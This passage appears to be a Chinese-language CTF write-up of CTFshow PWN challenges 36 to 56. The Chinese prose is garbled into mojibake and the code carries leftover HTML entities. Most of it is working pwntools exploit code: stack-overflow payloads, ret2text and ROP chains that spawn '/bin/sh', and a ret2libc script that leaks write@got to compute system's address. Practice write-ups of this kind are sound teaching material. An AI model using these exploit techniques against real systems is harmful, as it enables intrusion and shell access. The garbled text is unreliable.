‡å‡†é”™è¯¯æµ stderrã€‚fprintf ä¼šæ ¼å¼åŒ–å¹¶å†™å…¥ç¼“å†²åŒºï¼Œæœ€ç»ˆé€šè¿‡åº•å±‚ write è¾“å‡ºåˆ°ç»ˆç«¯æˆ–é‡å®šå‘çš„ç›®æ ‡ã€‚ fflush(stderr); å¼ºåˆ¶æŠŠ stderr çš„ç¼“å†²åŒºåˆ·å‡ºåˆ°æ–‡ä»¶æè¿°ç¬¦ï¼Œç¡®ä¿è¾“å‡ºç«‹åˆ»å¯è§ï¼ˆå°¤å…¶æ˜¯å½“ stderr è¢«è¡Œç¼“å†²æˆ–å…¨ç¼“å†²æ—¶ï¼‰ã€‚ ç”±äº stderr å¸¸å¸¸æ˜¯è¡Œç¼“å†²/æ— ç¼“å†²ï¼Œfflush å¯æé«˜è¾“å‡ºå¯é æ€§ï¼Œç¡®ä¿åœ¨éšåé€€å‡ºå‰å†…å®¹å·²å†™å‡ºã€‚ ç®€å•æ€»ç»“ä¸€ä¸‹ï¼š å½“ strcpy(dest, src) å†™å‡ºæ ˆè¾¹ç•Œå¹¶äº§ç”Ÿæ®µé”™è¯¯æ—¶ï¼Œå†…æ ¸å‘é€ SIGSEGVï¼Œç¨‹åºæ§åˆ¶æµä¼šè·³åˆ° sigsegv_handlerã€‚handler é‡Œä¼šå°†flagå†™åˆ°stderrï¼Œç„¶åé€€å‡ºç¨‹åºã€‚ ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªéœ€è¦æƒ³åŠæ³•åˆ©ç”¨Buffer Overflowè§¦å‘segmentation faultï¼Œä¾¿å¯ä»¥å¾—åˆ°flagã€‚ å› ä¸ºç»™deståˆ†é…çš„æ˜¯104ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥è¾“å…¥105ä¸ªå­—èŠ‚å³å¯ã€‚ 12&gt;&gt;&gt; print(&quot;A&quot;*105)AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 1234567891011121314151617$ ./pwnme AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA â–„â–„â–„â–„ â–„â–„â–„â–„â–„â–„â–„â–„ â–„â–„â–„â–„â–„â–„â–„â–„ â–„â–„ â–ˆâ–ˆâ–€â–€â–€â–€â–ˆ â–€â–€â–€â–ˆâ–ˆâ–€â–€â–€ â–ˆâ–ˆâ–€â–€â–€â–€â–€â–€ â–ˆâ–ˆ â–ˆâ–ˆâ–€ â–ˆâ–ˆ â–ˆâ–ˆ â–„â–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„ â–ˆâ–ˆâ–„â–ˆâ–ˆâ–ˆâ–ˆâ–„ â–„â–ˆâ–ˆâ–ˆâ–ˆâ–„ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–„â–„â–„â–„ â–€ â–ˆâ–ˆâ–€ â–ˆâ–ˆ â–ˆâ–ˆâ–€ â–€â–ˆâ–ˆ â–€â–ˆ â–ˆâ–ˆ â–ˆâ–€ â–ˆâ–ˆâ–„ â–ˆâ–ˆ â–ˆâ–ˆ â–€â–€â–€â–€â–ˆâ–ˆâ–„ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆâ–„â–ˆâ–ˆâ–„â–ˆâ–ˆ â–ˆâ–ˆâ–„â–„â–„â–„â–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–„â–„â–„â–„â–„â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–€â–ˆâ–ˆâ–„â–„â–ˆâ–ˆâ–€ â–€â–ˆâ–ˆ â–ˆâ–ˆâ–€ â–€â–€â–€â–€ â–€â–€ â–€â–€ â–€â–€â–€â–€â–€â–€ â–€â–€ â–€â–€ â–€â–€â–€â–€ â–€â–€ â–€â–€ * ************************************* * Classify: CTFshow --- PWN --- å…¥é—¨ * Type : Stack_Overflow * Site : https://ctf.show/ * Hint : See what the program does! * *************************************Where is flag?ctfshow&#123;5f912424-3426-45dd-9966-84c4247d058b&#125; Pwn36 12345678910â””â”€$ checksec pwn[*] &#x27;/home/archer/ctf-kali/pwn/pwn36/pwn&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x8048000) Stack: Executable RWX: Has RWX segments Stripped: No 123456789101112131415161718192021int __cdecl main(int argc, const char **argv, const char **envp)&#123; setvbuf(stdout, 0, 2, 0); puts(asc_804883C); puts(asc_80488B0); puts(asc_804892C); puts(asc_80489B8); puts(asc_8048A48); puts(asc_8048ACC); puts(asc_8048B60); puts(&quot; * ************************************* &quot;); puts(aClassifyCtfsho); puts(&quot; * Type : Stack_Overflow &quot;); puts(&quot; * Site : https://ctf.show/ &quot;); puts(&quot; * Hint : There are backdoor functions here! &quot;); puts(&quot; * ************************************* &quot;); puts(&quot;Find and use it!&quot;); puts(&quot;Enter what you want: &quot;); ctfshow(&amp;argc); return 0;&#125; ä¾æ—§æŸ¥çœ‹æœ€æ ¸å¿ƒçš„ctfshow()å‡½æ•°ï¼š 123456char *ctfshow()&#123; char s[36]; // [esp+0h] [ebp-28h] BYREF return gets(s);&#125; å‘ç°æ¼æ´gets()ã€‚ æŸ¥çœ‹Stackç»“æ„ï¼š åœ¨Exportsé‡Œå‘ç°ä¸€ä¸ªå¯ç–‘çš„å‡½æ•°get_flag()ï¼š 1234567891011121314int get_flag()&#123; char s[64]; // [esp+Ch] [ebp-4Ch] BYREF FILE *stream; // [esp+4Ch] [ebp-Ch] stream = fopen(&quot;/ctfshow_flag&quot;, &quot;r&quot;); if ( !stream ) &#123; puts(&quot;/ctfshow_flag: No such file or directory.&quot;); exit(0); &#125; fgets(s, 64, stream); return printf(s);&#125; è¿™ä¸ªå‡½æ•°ä¼šç›´æ¥æ‰“å°flagå†…å®¹ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨Buffer Overflowçš„æ¼æ´ä¿®æ”¹è¿”å›åœ°å€è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚ 123456789101112from pwn import *r = remote(&quot;pwn.challenge.ctf.show&quot;, 28180)get_flag = p32(0x08048586)payload = b&quot;A&quot;*40 + b&quot;B&quot;*4 + get_flag + b&quot;\\n&quot;r.sendafter(&quot;Enter what you want:&quot;,payload)r.interactive()# ctfshow&#123;89602abf-e798-4ebd-b48b-3e300905a6fa&#125; Pwn37 12345678â””â”€$ checksec pwn[*] &#x27;/home/archer/ctf-kali/pwn/pwn37/pwn&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Stripped: No 123456789int __cdecl main(int argc, const char **argv, const char **envp)&#123; init(&amp;argc); logo(); puts(&quot;Just very easy ret2text&amp;&amp;32bit&quot;); ctfshow(); puts(&quot;\\nExit&quot;); return 0;&#125; 123456ssize_t ctfshow()&#123; _BYTE buf[14]; // [esp+6h] [ebp-12h] BYREF return read(0, buf, 0x32u);&#125; å¯ä»¥å‘ç°è¿™é‡Œread()å‡½æ•°è®¾ç½®çš„å‚æ•°æœ‰é—®é¢˜ï¼Œè¯»å–çš„å†…å®¹é•¿åº¦è¿œå¤§äºbufçš„é•¿åº¦ã€‚ æ ˆç»“æ„ï¼š æŸ¥çœ‹Exportsï¼Œå‘ç°ä¸€ä¸ªbackdoor()å‡½æ•°ï¼š 12345int backdoor()&#123; system(&quot;/bin/sh&quot;); return 0;&#125; æ‰€ä»¥æˆ‘ä»¬ç›´æ¥åˆ©ç”¨Buffer Overflowè¦†ç›–æ‰bufå¹¶å°†è¿”å›åœ°å€ä¿®æ”¹ä¸ºbackdoorå‡½æ•°çš„åœ°å€å³å¯ã€‚ 1234567891011121314from pwn import *r = remote(&quot;pwn.challenge.ctf.show&quot;, 28105)backdoor = p32(0x08048521)payload = b&quot;A&quot;*(16+2) + b&quot;B&quot;*4 + backdoor + b&quot;\\n&quot;r.sendafter(&quot;Just very easy ret2text&amp;&amp;32bit&quot;,payload)r.sendline(&quot;cat ctfshow_flag&quot;)r.interactive()# ctfshow&#123;64195e89-1576-4a46-94df-fc156c7d0dd2&#125; Pwn38 12345678â””â”€$ checksec pwn[*] &#x27;/home/archer/ctf-kali/pwn/pwn38/pwn&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Stripped: No 12345678910111213141516171819202122int __fastcall main(int argc, const char **argv, const char **envp)&#123; setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); puts(s); puts(asc_400890); puts(asc_400910); puts(asc_4009A0); puts(asc_400A30); puts(asc_400AB8); puts(asc_400B50); puts(&quot; * ************************************* &quot;); puts(aClassifyCtfsho); puts(&quot; * Type : Stack_Overflow &quot;); puts(&quot; * Site : https://ctf.show/ &quot;); puts(&quot; * Hint : It has system and &#x27;/bin/sh&#x27;.There is a backdoor function&quot;); puts(&quot; * ************************************* &quot;); puts(&quot;Just easy ret2text&amp;&amp;64bit&quot;); ctfshow(); puts(&quot;\\nExit&quot;); return 0;&#125; 123456ssize_t ctfshow()&#123; _BYTE buf[10]; // [rsp+6h] [rbp-Ah] BYREF return read(0, buf, 0x32uLL);&#125; å’Œä¸Šä¸€é¢˜åŸºæœ¬ä¸Šä¸€æ¨¡ä¸€æ ·ã€‚ ä½†æœ€æ ¸å¿ƒçš„åŒºåˆ«åœ¨äºï¼šç”±äºbackdoorå‡½æ•°é‡Œä¼šä½¿ç”¨callå‘½ä»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œéœ€è¦ä¿è¯æ ˆå¯¹é½ï¼ˆstack alignmentï¼‰ã€‚å› ä¸ºx86_64 System V ABI è¦æ±‚ï¼šåœ¨æ‰§è¡Œ call æŒ‡ä»¤ä¹‹å‰ï¼ŒRSP å¿…é¡» 16 å­—èŠ‚å¯¹é½ã€‚ æ‰€ä»¥éœ€è¦é¢å¤–ä½¿ç”¨ä¸€ä¸ªretå‘½ä»¤ï¼Œå³å°†åŸæœ¬çš„è¿”å›åœ°å€ä¿®æ”¹ä¸ºretå‘½ä»¤çš„åœ°å€ï¼Œç„¶åè·Ÿä¸Šbackdoorå‡½æ•°çš„åœ°å€ã€‚ 1234567891011121314151617181920from pwn import *r = remote(&quot;pwn.challenge.ctf.show&quot;, 28136)elf = ELF(&#x27;./pwn&#x27;)# æ‰¾ ret æŒ‡ä»¤rets_iter = elf.search(asm(&#x27;ret&#x27;))ret_addr = next(rets_iter)ret = p64(ret_addr)backdoor = p64(0x0000000000400657)payload = b&quot;A&quot;*(10+8) + ret + backdoor + b&quot;\\n&quot;r.sendafter(&quot;Just easy ret2text&amp;&amp;64bit&quot;,payload)r.sendline(&quot;cat ctfshow_flag&quot;)r.interactive()# ctfshow&#123;90f8e2c6-c456-4a17-92b3-1ff6e2db4cd9&#125; 32-bitçš„åŸºæœ¬å¯¹é½å•ä½æ˜¯4å­—èŠ‚ï¼šè¿”å›åœ°å€ä¸æ ˆå¸§ç®¡ç†ä»¥4çš„å€æ•°ç§»åŠ¨ -&gt; å¯¹é½ç¨³å®šã€é—®é¢˜å°‘ã€‚64-bitçš„ABIè¦æ±‚16å­—èŠ‚å¯¹é½ï¼Œä½† call/ret çš„å˜åŒ–æ˜¯8å­—èŠ‚ -&gt; RSP ä¼šåœ¨(0 mod 16)ä¸(8 mod 16)ä¸¤ç§çŠ¶æ€é—´åˆ‡æ¢ ã€‚ Pwn39 12345678â””â”€$ checksec pwn[*] &#x27;/home/archer/ctf-kali/pwn/pwn39/pwn&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Stripped: No 12345678910111213141516171819202122int __cdecl main(int argc, const char **argv, const char **envp)&#123; setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); puts(asc_804876C); puts(asc_80487E0); puts(asc_804885C); puts(asc_80488E8); puts(asc_8048978); puts(asc_80489FC); puts(asc_8048A90); puts(&quot; * ************************************* &quot;); puts(aClassifyCtfsho); puts(&quot; * Type : Stack_Overflow &quot;); puts(&quot; * Site : https://ctf.show/ &quot;); puts(&quot; * Hint : It has system and &#x27;/bin/sh&#x27;,but they don&#x27;t work together&quot;); puts(&quot; * ************************************* &quot;); puts(&quot;Just easy ret2text&amp;&amp;32bit&quot;); ctfshow(&amp;argc); puts(&quot;\\nExit&quot;); return 0;&#125; è¿˜æ˜¯ä¸€æ ·çš„æ¼æ´ï¼š 123456ssize_t ctfshow()&#123; _BYTE buf[14]; // [esp+6h] [ebp-12h] BYREF return read(0, buf, 0x32u);&#125; å¹¶ä¸”å‘ç°ä¸€ä¸ªå¥‡æ€ªçš„hint()å‡½æ•°ï¼š 12345int hint()&#123; puts(&quot;/bin/sh&quot;); return system(&quot;echo &#x27;You find me?&#x27;&quot;);&#125; æ‰¾åˆ°&quot;/bin/sh&quot;å­—ç¬¦ä¸²çš„åœ°å€ï¼š æ‰€ä»¥æ€è·¯å¦‚ä¸‹ï¼šå°†è¿”å›åœ°å€ä¿®æ”¹ä¸ºsystemå‡½æ•°ï¼Œå¹¶å°†&quot;/bin/sh&quot;ä½œä¸ºå‚æ•°ä¼ é€’ç»™systemã€‚ 123456789101112131415161718from pwn import *r = remote(&quot;pwn.challenge.ctf.show&quot;, 28309)elf = ELF(&#x27;./pwn&#x27;)system = p32(0x080483A0)# system = p32(elf.sym[&#x27;system&#x27;])bin_sh = p32(0x08048750)payload = b&quot;A&quot;*(0x12+4) + system + p32(0) + bin_sh + b&quot;\\n&quot;r.sendafter(&quot;Just easy ret2text&amp;&amp;32bit&quot;,payload)r.sendline(&quot;cat ctfshow_flag&quot;)r.interactive()# ctfshow&#123;e62b2132-b552-439b-992f-7965c0d65d4f&#125; è¿™ä¸ªp32(0)å…¶å®å°±æ˜¯ç»™ system å‡½æ•°å ä½çš„å‡è¿”å›åœ°å€ã€‚å®ƒæ˜¯å¿…é¡»çš„ï¼Œå› ä¸ºåœ¨32-bitçš„è°ƒç”¨çº¦å®šé‡Œå‡½æ•°çš„å‚æ•°æ˜¯æ”¾åœ¨æ ˆä¸Šçš„ï¼Œä¸”åœ¨å‡½æ•°å…¥å£å¤„ç¬¬ä¸€ä¸ªå‚æ•°ä½äº ESP+4ï¼ˆESP æŒ‡å‘è¿”å›åœ°å€ï¼‰ã€‚ Pwn40 12345678â””â”€$ checksec pwn[*] &#x27;/home/archer/ctf-kali/pwn/pwn40/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No 12345678910111213141516171819202122int __fastcall main(int argc, const char **argv, const char **envp)&#123; setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); puts(asc_400828); puts(asc_4008A0); puts(asc_400920); puts(asc_4009B0); puts(asc_400A40); puts(asc_400AC8); puts(asc_400B60); puts(&quot; * ************************************* &quot;); puts(aClassifyCtfsho); puts(&quot; * Type : Stack_Overflow &quot;); puts(&quot; * Site : https://ctf.show/ &quot;); puts(&quot; * Hint : It has system and &#x27;/bin/sh&#x27;,but they don&#x27;t work together&quot;); puts(&quot; * ************************************* &quot;); puts(&quot;Just easy ret2text&amp;&amp;64bit&quot;); ctfshow(); puts(&quot;\\nExit&quot;); return 0;&#125; 123456ssize_t ctfshow()&#123; _BYTE buf[10]; // [rsp+6h] [rbp-Ah] BYREF return read(0, buf, 0x32uLL);&#125; è¿™é“é¢˜çš„æ€è·¯åŒæ ·æ˜¯æƒ³åŠæ³•è°ƒç”¨system()å‡½æ•°å¹¶ä¼ å…¥/bin/shä½œä¸ºå‚æ•°ã€‚ åˆ©ç”¨pwntoolså¯ä»¥ç¡®å®šè¿™ä¸ªç¨‹åºæŸä¸ªåœ°æ–¹ä½¿ç”¨äº†pop rdi ; retå‘½ä»¤å¹¶å¯ä»¥æ‰¾åˆ°å®ƒçš„åœ°å€ã€‚ 1234567from pwn import *elf = ELF(&#x27;./pwn&#x27;)pop_rdi = p64(next(elf.search(asm(&#x27;pop rdi ; ret&#x27;, arch=&#x27;amd64&#x27;))))# print(pop_rdi)# 4196323 å¯ä»¥ç¡®å®šè¿™ä¸ªç¨‹åºæŸä¸ªåœ°æ–¹ä½¿ç”¨äº†pop rdi ; retå‘½ä»¤å¹¶å¯ä»¥æ‰¾åˆ°å®ƒçš„åœ°å€ã€‚ å…ˆæ¥è§£é‡Šä¸€ä¸‹è¿™ä¸ªå‘½ä»¤ï¼špop rdi ; ret ä¼šä»å½“å‰æ ˆé¡¶å–å‡ºä¸€ä¸ªå€¼æ”¾å…¥ rdi å¯„å­˜å™¨ï¼ˆå³å‡½æ•°ç¬¬ 1 ä¸ªå‚æ•°ï¼‰ï¼Œç„¶åè·³è½¬åˆ°ä¸‹ä¸€ä¸ªåœ°å€ç»§ç»­æ‰§è¡Œã€‚ åœ¨ x86-64 System V è°ƒç”¨çº¦å®šä¸­ï¼Œå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°é€šè¿‡ rdi ä¼ é€’ï¼Œå®ƒä¼ çš„æ˜¯å€¼ï¼Œä¸æ˜¯åœ°å€ï¼›å¦‚æœè¿™ä¸ªå€¼æ˜¯åœ°å€ç±»å‹ï¼ˆå¦‚æŒ‡é’ˆï¼‰ï¼Œå‡½æ•°å†…éƒ¨æ‰ä¼šç”¨å®ƒå½“ä½œåœ°å€æ¥è¯»å–å†…å®¹ã€‚ è€Œretå‘½ä»¤å…·ä½“æ‰§è¡Œçš„å†…å®¹æ˜¯ï¼š ä» [rsp] å– 8 å­—èŠ‚ â†’ èµ‹å€¼ç»™ ripï¼ˆæŒ‡ä»¤æŒ‡é’ˆï¼‰ rsp += 8 æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‘½ä»¤æ„é€ ä¸€æ¡è¿™æ ·çš„ROPé“¾ï¼š 1234567891011pop_rdi = p64(next(elf.search(asm(&#x27;pop rdi ; ret&#x27;, arch=&#x27;amd64&#x27;))))# print(pop_rdi)# 4196323bin_sh = p64(0x400808)ret = p64(next(elf.search(asm(&#x27;ret&#x27;, arch=&#x27;amd64&#x27;))))system = p64(elf.sym[&#x27;system&#x27;])payload = b&quot;A&quot;*(0xA+8) + pop_rdi + bin_sh + ret + system + b&quot;\\n&quot; ä¸ä¹‹å‰ä¸€æ ·ï¼Œè¿™é‡Œçš„retåŒæ ·æ˜¯ä¸ºäº†ä¿è¯Stackå¯¹é½ã€‚ 1234567891011121314151617181920212223242526from pwn import *r = remote(&quot;pwn.challenge.ctf.show&quot;, 28310)elf = ELF(&#x27;./pwn&#x27;)pop_rdi = p64(next(elf.search(asm(&#x27;pop rdi ; ret&#x27;, arch=&#x27;amd64&#x27;))))# print(pop_rdi)# 4196323bin_sh = p64(0x400808)ret = p64(next(elf.search(asm(&#x27;ret&#x27;, arch=&#x27;amd64&#x27;))))system = p64(elf.sym[&#x27;system&#x27;])payload = b&quot;A&quot;*(0xA+8) + pop_rdi + bin_sh + ret + system + b&quot;\\n&quot;r.sendafter(&quot;Just easy ret2text&amp;&amp;64bit&quot;,payload)r.sendline(&quot;cat ctfshow_flag&quot;)r.interactive()# ctfshow&#123;ecc4ad83-cec6-4ea9-af2e-47230707655a&#125; Pwn42 12345678â””â”€$ checksec pwn[*] &#x27;/home/archer/ctf-kali/pwn/pwn42/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No 123456789int __fastcall main(int argc, const char **argv, const char **envp)&#123; setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); logo(); ctfshow(); puts(&quot;\\nExit&quot;); return 0;&#125; 123456ssize_t ctfshow()&#123; _BYTE buf[10]; // [rsp+6h] [rbp-Ah] BYREF return read(0, buf, 0x32u);&#125; é¦–å…ˆå¯ä»¥åœ¨IDAçš„Importsé¡µé¢çœ‹åˆ°systemå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯é¢˜ç›®é‡Œè¯´çš„æœ‰system()ï¼š è€Œåœ¨Importsé¡µé¢é‡Œå¯ä»¥å‘ç°ä¸€ä¸ªusefulå‡½æ•°ï¼š 1234int useful()&#123; return printf(&quot;sh&quot;);&#125; æˆ‘ä»¬åˆšå¥½å¯ä»¥åˆ©ç”¨è¿™ä¸ªâ€shâ€æ¥ä»£æ›¿â€/bin/shâ€ï¼Œå°†å…¶ä¼ é€’ç»™system()ã€‚ æœ€åå†ç¡®è®¤ä¸€ä¸‹Stackç»“æ„ä»¥åŠåç§»ï¼š Exploitï¼š 12345678910111213141516171819202122from pwn import *r = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28311)elf = ELF(&#x27;./pwn&#x27;,checksec = &quot;False&quot;)system = p64(elf.sym[&#x27;system&#x27;])pop_rdi = p64(next(elf.search(asm(&#x27;pop rdi ; ret&#x27;, arch=&#x27;amd64&#x27;))))sh = p64(next(elf.search(b&#x27;sh&#x27;)))ret = p64(next(elf.search(asm(&#x27;ret&#x27;, arch=&#x27;amd64&#x27;))))payload = b&quot;A&quot;*18 + pop_rdi + sh + ret + systemr.sendline(payload)r.recv()r.sendline(b&#x27;cat ctfshow_flag&#x27;)r.interactive()# ctfshow&#123;f73de357-2080-4c01-9167-464f37a3e682&#125; Ret2libcPwn46 123456789int __fastcall main(int argc, const char **argv, const char **envp)&#123; init(argc, argv, envp); logo(); puts(&quot;O.o?&quot;); ctfshow(); write(0, &quot;Hello CTFshow!\\n&quot;, 0xEu); return 0;&#125; 123456ssize_t ctfshow()&#123; _BYTE buf[112]; // [rsp+0h] [rbp-70h] BYREF return read(0, buf, 0xC8u);&#125; æ¼æ´ä¾æ—§æ˜¯readå‡½æ•°å¯¼è‡´çš„Buffer Overflowã€‚ ç°åœ¨æˆ‘ä»¬è™½ç„¶æ²¡æœ‰ç›´æ¥çš„systemå‡½æ•°å’Œ&quot;/bin/sh&quot;ã€‚ä½†æ˜¯systemå‡½æ•°æ˜¯å±äºlibcçš„ï¼Œè€Œlibc.soåŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°ä¹‹é—´çš„ç›¸å¯¹åç§»æ˜¯å›ºå®šçš„ã€‚ è€Œå‡å¦‚æˆ‘ä»¬å¯ä»¥å¾—çŸ¥libcä¸­æŸä¸ªå‡½æ•°çš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®è¯¥ç¨‹åºåˆ©ç”¨çš„libcæ¥è®¡ç®—å‡ºsystemå‡½æ•°çš„åœ°å€ã€‚å¹¶ä¸”libcä¸­å…¶å®ä¹Ÿæœ‰&quot;/bin/sh&quot;å­—ç¬¦ä¸²çš„ã€‚æ‰€ä»¥éƒ½å¯ä»¥è·å¾—ã€‚ é‚£ä¹ˆè¯¥æ€æ ·å®Œæˆç¬¬ä¸€æ­¥å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ç”¨è¿™é‡Œçš„write()å‡½æ•°ã€‚ æ€è·¯å¦‚ä¸‹ï¼š æ³„éœ²writeå‡½æ•°åœ°å€ï¼š å…ˆæ¥çœ‹ä¸€ä¸‹writeå‡½æ•°çš„è¯­æ³•ï¼š 1ssize_t write(int fd, const void *buf, size_t count); å«ä¹‰ä¸å‚æ•° fdï¼šæ–‡ä»¶æè¿°ç¬¦ã€‚å¸¸è§ 0=stdinï¼Œ1=stdoutï¼Œ2=stderrï¼›ä¹Ÿå¯ä»¥æ˜¯æ™®é€šæ–‡ä»¶ã€ç®¡é“ã€socket ç­‰ã€‚ bufï¼šå¾…å†™å‡ºçš„å†…å­˜èµ·å§‹åœ°å€ã€‚ countï¼šå¸Œæœ›å†™å‡ºçš„å­—èŠ‚æ•°ã€‚ æ‰€ä»¥æˆ‘ä»¬å¸Œæœ›è¿™æ ·è°ƒç”¨writeå‡½æ•°ï¼š 1write@plt(fd=1, buf=&amp;write@got, count=rdx) write@pltï¼šæ˜¯ä»£ç æ®µé‡Œçš„è·³æ¿ï¼ˆstubï¼‰åœ°å€ï¼Œä¸€å°æ®µå¯æ‰§è¡ŒæŒ‡ä»¤ã€‚éœ€è¦é€šè¿‡è°ƒç”¨å®ƒï¼ˆæŠŠ RIP è·³è¿‡å»ï¼‰æ¥é—´æ¥è°ƒç”¨çœŸæ­£çš„ libc::writeã€‚ &amp;write@gotï¼šæ˜¯æ•°æ®æ®µé‡Œ GOT è¡¨é¡¹çš„å†…å­˜åœ°å€ï¼ˆ8 å­—èŠ‚ï¼‰ã€‚è¿™ä¸ªè¡¨é¡¹é‡Œå­˜æ”¾ç€çœŸæ­£çš„å‡½æ•°åœ°å€ï¼ˆè§£æåå°±æ˜¯ libc ä¸­ write çš„çœŸå®æŒ‡é’ˆï¼‰ã€‚å¯ä»¥æŠŠå®ƒå½“æ•°æ®æŒ‡é’ˆç”¨ï¼Œæ¯”å¦‚ write(1, &amp;write@got, 8) å°±èƒ½æŠŠé‚£ 8 å­—èŠ‚â€œæŒ‡é’ˆå€¼â€æ‰“å°å‡ºæ¥ã€‚ æŒ‰ SysV x64 ABIï¼Œå‡½æ•°å‰ä¸‰ä¸ªå‚æ•°æ”¾åœ¨ rdi, rsi, rdxã€‚ åˆ©ç”¨pop_rdi + p64(1)æ¥è®¾ç½®ç¬¬ä¸€ä¸ªå‚æ•°ï¼› å†åˆ©ç”¨pop_rsi_r15 + write_got + p64(0)è®¾ç½®ç¬¬äºŒä¸ªå‚æ•°ï¼› æœ€åå†retåˆ°write@pltï¼› æˆ‘ä»¬æ²¡æœ‰ pop rdx gadgetï¼Œä½†å‰é¢åˆšè°ƒç”¨è¿‡ read(0, buf, 0xC8)ã€‚æ‰€ä»¥åœ¨æˆ‘ä»¬æ¥ç®¡è¿”å›åœ°å€æ—¶ï¼Œå¯„å­˜å™¨ rdx ä»ä¿ç•™ä¸º 0xC8ã€‚ ç­‰writeæ‰§è¡Œå®Œäº†æˆ‘ä»¬å†å°†è¿”å›åœ°å€ä¿®æ”¹æˆmainï¼Œè®©æ•´ä¸ªç¨‹åºå†è·‘ä¸€éï¼Œç”¨äºæ³¨å…¥æ‰§è¡Œsystem(&#39;/bin/sh&#39;)ã€‚ è·å–libcç‰ˆæœ¬ åˆ©ç”¨pythonçš„LibcSearcheråº“ï¼š 1234write = u64(r.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;write&#x27;,write)libc_base = write - libc.dump(&#x27;write&#x27;) è·å–systemå‡½æ•°ä¸&quot;/bin/sh&quot;çš„åœ°å€ 12system = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;) å†æ¬¡æ‰§è¡Œç¨‹åº è§¦å‘æ ˆæº¢å‡ºæ‰§è¡Œsystem(&#39;/bin/sh&#39;) å¯ä»¥ä½¿ç”¨GDBæŸ¥æ‰¾gadgetsçš„åœ°å€ï¼š Exploitï¼š 123456789101112131415161718192021222324252627282930313233343536from pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)r = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28258)elf = ELF(&#x27;./pwn&#x27;)write_plt = p64(elf.plt[&#x27;write&#x27;])write_got = p64(elf.got[&#x27;write&#x27;])main = p64(elf.sym[&#x27;main&#x27;])# pop_rdi = p64(0x400803)pop_rdi = p64(next(elf.search(asm(&#x27;pop rdi ; ret&#x27;, arch=&#x27;amd64&#x27;))))pop_rsi_r15 = p64(0x400801) # pop rsi ; pop r15 ; retpayload = b&quot;A&quot;*(0x70+8)payload += pop_rdi + p64(1) # rdi = 1 (stdout)payload += pop_rsi_r15 + write_got + p64(0) # rsi = &amp;write@got, r15 å ä½payload += write_plt # ret åˆ° write@pltpayload += main # write è¿”å›åå†å› mainr.sendlineafter(b&quot;O.o?&quot;,payload)write = u64(r.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(write))libc = LibcSearcher(&#x27;write&#x27;,write)libc_base = write - libc.dump(&#x27;write&#x27;)system = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)payload = b&quot;A&quot;*(0x70+8) + pop_rdi + p64(bin_sh) + p64(system)r.sendlineafter(b&quot;O.o?&quot;,payload)r.interactive() Pwntoolsçš„shellcodePwntoolsçš„shellcodeçš„å­—èŠ‚é•¿åº¦å¦‚ä¸‹ï¼š 12345678910from pwn import *# context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)# shellcode_32 = asm(shellcraft.sh())# print(len(shellcode_32)) # 44context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)shellcode_64 = asm(shellcraft.sh())print(len(shellcode_64)) # 48 Pwn56 12345678â””â”€$ checksec pwn[*] &#x27;/home/archer/ctf-kali/pwn/pwn56/pwn&#x27; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) Stripped: No 1234567891011121314public startstart proc nearpush 